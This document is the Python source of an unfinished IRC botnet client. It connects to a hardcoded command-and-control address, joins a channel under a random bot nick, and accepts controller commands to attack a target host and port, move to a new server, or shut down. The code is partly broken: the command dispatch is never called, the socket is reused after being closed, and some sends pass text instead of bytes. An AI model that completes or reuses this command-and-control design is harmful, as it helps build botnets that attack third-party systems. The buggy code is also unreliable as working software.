import random, socket, sys

HOST = "199.116.235.44"
PORT = 12399
NICK = ""
PASS = ""
CHAN = ""

BUF_SIZE = 1024

botName = ""
username = ""
secret = ""

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#arguments hostname port channel secret-phrase


def startConn():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))


    while 1:
        botNum = ''.join(random.choice('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(6))
        botName = "nicebot-" + botNum

        usr = "USER %s %s %s :%s\r\n" % (botName, botName, botName, botName)

        s.send(usr.encode('utf-8'))
        nick = "NICK %s \r\n" % (botName)
        s.send(nick.encode('utf-8'))
        rec = s.recv(1024).decode("utf-8")
        print(rec)
        prefix, command, args = parsemsg(rec)

        if command != "433":
            break

    chan = "JOIN %s\r\n" % (CHAN)
    s.send(chan.encode('utf-8'))

    while 1:
       rec = s.recv(1024).decode("utf-8")
       print(rec)

def parsecmd(command, *args):
    if command == "status":
        status()
    elif command == "attack":
        attack(args[0], args[1])
    elif command == "move":
        move(args[0], args[1], args[2])
    elif command == "shutdown":
        shutdown()

#from carlos' twitch IRC bot, idk if it works with other IRCs
def parsemsg(s):
    """Breaks a message from an IRC server into its prefix, command, and arguments.
    """
    prefix = ''
    trailing = []
    if not s:
        raise IRCBadMessage("Empty line.")
    if s[0] == ':':
        prefix, s = s[1:].split(' ', 1)
    if s.find(' :') != -1:
        s, trailing = s.split(' :', 1)
        args = s.split()
        args.append(trailing)
    else:
        args = s.split()
    command = args.pop(0)

    # parsemsg(":test!~test@test.com PRIVMSG #channel :Hi!")
    # ('test!~test@test.com', 'PRIVMSG', ['#channel', 'Hi!'])

    return prefix, command, args

def status():
    msg = "HI"
    #private message controller

def attack(atkhost, atkport):
    atkmsg = "1"
    success = False
    try:
        atkSock = socket.socket()
        atkSock.connect((atkhost, atkport))
        atkSock.send(atkmsg)
        atkSock.close()
        success = True
    except:
        print("attack failed")

    #report back to controller

def move(newhost, newport, newchan):
    success = False
    s.close()

    try:
        s.connect((newhost, newport))

        #join IRC
        s.send("NICK %s \r\n" % (botName))
        s.send("JOIN %s\r\n" % (newchan))
    except:
        print("failed to move to new channel") # we may want to handle a few more specific errors, this is general for now

    #if failure, keep trying? or maybe stay on old IRC?

def shutdown():
    shutdownmsg = " disconnected" #needs to be formatted properly for a private message
    s.send(shutdownmsg)
    sys.exit(0)

if __name__ == '__main__':
    HOST = sys.argv[1]
    PORT = int(sys.argv[2])
    CHAN = "#" + sys.argv[3]
    secret = sys.argv[4]
    startConn()
